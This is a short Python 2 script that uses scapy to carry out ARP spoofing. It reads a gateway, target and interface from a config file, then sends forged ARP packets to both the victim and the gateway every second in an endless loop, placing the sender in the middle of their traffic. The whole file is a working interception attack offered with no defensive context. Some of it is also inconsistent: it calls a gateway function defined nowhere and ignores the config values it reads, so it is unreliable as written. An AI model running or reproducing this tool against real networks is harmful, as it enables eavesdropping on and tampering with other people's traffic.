#!/usr/bin/env python

#scapy setup
import sys, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
#config file reader and unicode support
from ConfigParser import SafeConfigParser
import codecs

parser = SafeConfigParser()
# Open the file with the correct encoding
with codecs.open('interceptor.conf', 'r', encoding='utf-8') as f:
    parser.readfp(f)

gatewayip = parser.get('arpmodule', 'gatewayip')
targetip = parser.get('arpmodule', 'targetip')
interface = parser.get('arpmodule', 'interface')


def create_packet(src_ip, dst_ip, iface):
	packet = ARP()
	packet.psrc = src_ip
	packet.pdst = dst_ip
	packet.hwsrc = get_if_hwaddr(iface)
	return packet


gateway = get_default_gateway_ip(interface)


to_victim = create_packet(gateway, sys.argv[1], interface)
to_gateway = create_packet(sys.argv[1], gateway, interface)
print interface, gateway

while 1:
	send(to_victim, verbose=0)
	send(to_gateway, verbose=0)
	time.sleep(1)

